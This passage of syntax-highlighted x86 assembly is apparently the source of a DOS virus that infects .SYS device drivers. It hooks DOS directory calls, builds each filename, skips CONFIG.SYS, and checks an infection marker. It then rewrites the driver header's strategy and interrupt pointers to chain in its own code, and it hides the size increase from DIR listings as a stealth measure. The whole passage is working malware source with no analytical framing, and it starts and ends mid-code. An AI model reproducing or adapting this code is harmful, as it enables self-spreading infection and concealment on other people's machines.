&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; DS:BX-&gt;DTA</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0FFh</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; extended FCB?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; regularFCB&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; continue if not</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; otherwise, convert to regular FCB</span><br />
<br />
regularFCB<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">29</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get file size</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>filesize<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ES = CS</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br />
<br />
<span style="color: black; font-style: italic;">; The following code converts the FCB to an ASCIIZ string</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>filename<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; destination buffer</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; source buffer - filename</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'OC'</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; do not infect CONFIG.SYS</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; bombout<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">8</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; copy up to 8 bytes</span><br />
<br />
back<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">' '</span> &nbsp; <span style="color: black; font-style: italic;">; is it a space?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; copy_done &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; if so, done copying</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; otherwise, move character to buffer</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; back<br />
<br />
copy_done<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'.'</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; copy period</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'YS'</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">9</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; source buffer - extension</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; check if it has the SYS</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; bombout &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; extension and exit if it</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; does not</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; bombout<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; copy 'SYS' to the buffer</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; copy null byte</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; es:bx -&gt; DTA</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; es:di -&gt; DTA</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; open file, read/only</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; open&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; al already 0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jc</span>&nbsp; &nbsp; &nbsp; bombout &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; exit on error</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3fh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; read first</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; two bytes of</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; the header</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3eh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; close file</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
<br />
InfectSYS<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer<span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">; if first word not FFFF</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; continueSYS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; assume already infected</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; this is a safe bet since</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; most SYS files do not have</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; another SYS file chained on</span><br />
<br />
alreadyinfected<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">+</span><span style="color: #ff0000;">29</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> heap <span style="color: #339933;">-</span> header &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; hide file size increase</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; during a DIR command</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; This causes CHKDSK errors</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;sbb&nbsp; &nbsp; word ptr es:[di+31], 0&nbsp; ; not needed because SYS files</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; are limited to 64K maximum</span><br />
<br />
bombout<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">iret</span><br />
<br />
continueSYS<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>offset header<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>offset bigbuffer<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> offset endheader <span style="color: #339933;">-</span> offset header<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>filesize<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> offset _strategy <span style="color: #339933;">-</span> offset header&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calc offset to</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>bigbuffer<span style="color: #339933;">+</span><span style="color: #ff0000;">6</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;strategy routine</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> offset _interrupt <span style="color: #339933;">-</span> offset _strategy&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calc ofs to</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>bigbuffer<span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;interrupt routine</span><br />
<br />
continueinfection<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4300h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get file attributes</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>filename<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; save attributes on stack</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; save filename on stack</span><br />
